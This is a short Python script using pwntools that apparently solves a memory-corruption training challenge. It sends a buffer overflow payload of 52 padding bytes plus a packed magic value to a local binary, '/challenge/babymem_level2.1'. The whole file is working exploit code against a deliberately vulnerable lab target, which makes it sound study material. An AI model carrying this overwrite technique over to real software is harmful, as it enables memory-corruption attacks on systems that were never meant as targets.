import pwn

# Prepare the payload
payload = b"A" * 52  # Fill the buffer to reach the desired overwrite location
payload += pwn.p32(0x1AD8C46C)  # Append the magic value

# Use the pwntools process module to interact with the challenge binary
with pwn.process("/challenge/babymem_level2.1") as p:
    p.write(str(len(payload)) + "\n")  # Send the length of our payload
    p.write(payload)  # Send the payload itself
    print(p.readallS())  # Print any response we get from the binary

